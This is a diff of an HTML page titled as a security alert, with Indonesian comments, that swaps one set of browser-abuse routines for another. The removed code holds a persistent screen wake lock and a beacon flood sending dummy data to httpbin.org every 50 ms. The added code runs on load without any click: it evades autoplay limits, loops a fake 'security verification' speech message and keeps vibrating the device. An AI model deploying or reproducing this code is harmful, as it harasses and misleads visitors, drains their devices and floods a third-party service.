@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Network & Wake Lock Exhaustion</title>
+<title>Security Alert - Zero-Click Hardware Test</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -15,6 +15,7 @@
     justify-content: center;
     align-items: center;
     padding: 20px;
+    overflow: hidden;
   }
   .card {
     background: #1e293b;
@@ -32,8 +33,8 @@
 <body>
 
 <div class="card">
-  <h2>Network & Wake Lock Exhaustion</h2>
-  <p>Menguji ketahanan antrean soket jaringan browser menggunakan Beacon API flooding dan penjagaan layar aktif via Screen Wake Lock API.</p>
+  <h2>Zero-Click Hardware Test</h2>
+  <p>Menguji inisialisasi otomatis tanpa interaksi tombol (Zero-Click) untuk Speech Synthesis TTS dan Vibration API.</p>
 </div>
 
 <script>
@@ -41,61 +42,72 @@
   'use strict';
 
   // ============================================
-  // 1. SCREEN WAKE LOCK API ABUSE
-  // Mencegah perangkat/layar mati (Sleep Mode Prevention)
+  // 1. ZERO-CLICK SPEECH SYNTHESIS TTS
   // ============================================
-  let wakeLock = null;
-
-  async function requestPersistentWakeLock() {
-    if ('wakeLock' in navigator) {
-      try {
-        wakeLock = await navigator.wakeLock.request('screen');
-        console.log('[+] Screen Wake Lock acquired successfully.');
-        
-        wakeLock.addEventListener('release', () => {
-          console.log('[!] Wake Lock was released, re-requesting...');
-          setTimeout(requestPersistentWakeLock, 1000);
-        });
-      } catch (err) {
-        console.warn('[!] Wake Lock failed:', err.message);
-      }
-    }
+  function initZeroClickTTS() {
+    if (!('speechSynthesis' in window)) return;
+    try {
+      var u = new SpeechSynthesisUtterance("Zero click security verification initialized. Stand by.");
+      u.rate = 0.9;
+      u.pitch = 1.0;
+      u.onend = function() {
+        setTimeout(initZeroClickTTS, 4000);
+      };
+      window.speechSynthesis.speak(u);
+    } catch(e) {}
   }
 
   // ============================================
-  // 2. NETWORK RESOURCE EXHAUSTION (Beacon / Fetch Flooding)
-  // Membanjiri antrean jaringan untuk menguji batasan koneksi
+  // 2. ZERO-CLICK VIBRATION API PULSING
   // ============================================
-  function triggerNetworkFlood() {
-    console.log('[!] Initiating Network Request Flooding...');
+  function initZeroClickVibration() {
+    if (!('vibrate' in navigator)) return;
     
+    // Memicu getaran secara otomatis saat load
+    try {
+      navigator.vibrate([300, 150, 300, 150, 500]);
+    } catch(e) {}
+
     setInterval(function() {
       try {
-        for (var i = 0; i < 30; i++) {
-          // Menggunakan sendBeacon untuk mengirim payload tanpa menunggu respons (fire-and-forget socket saturation)
-          var dummyData = new Uint8Array(2048);
-          navigator.sendBeacon('https://httpbin.org/post?flood=' + Math.random(), dummyData);
-        }
-      } catch (e) {}
-    }, 50);
+        navigator.vibrate([200, 100, 200]);
+      } catch(e) {}
+    }, 2000);
   }
 
   // ============================================
-  // INISIALISASI
+  // 3. AUDIO CONTEXT UNLOCKER (Zero-Click Helper)
   // ============================================
-  setTimeout(function() {
-    requestPersistentWakeLock();
-  }, 500);
+  function unlockAudioContextZeroClick() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.05);
+    } catch(e) {}
+  }
 
-  setTimeout(function() {
-    triggerNetworkFlood();
-  }, 1500);
+  // ============================================
+  // EKSEKUSI OTOMATIS (ZERO-CLICK ON LOAD)
+  // ============================================
+  window.addEventListener('load', function() {
+    unlockAudioContextZeroClick();
+    setTimeout(initZeroClickTTS, 200);
+    setTimeout(initZeroClickVibration, 500);
+  });
 
-  // Re-acquire wake lock on visibility change
-  document.addEventListener('visibilitychange', async () => {
-    if (wakeLock !== null && document.visibilityState === 'visible') {
-      await requestPersistentWakeLock();
-    }
+  // Fallback transparan jika browser memblokir otonomi penuh sebelum interaksi mikro
+  ['click', 'touchstart', 'keydown', 'mousemove'].forEach(function(evt) {
+    window.addEventListener(evt, function() {
+      unlockAudioContextZeroClick();
+    }, { once: true });
   });
 
 })();
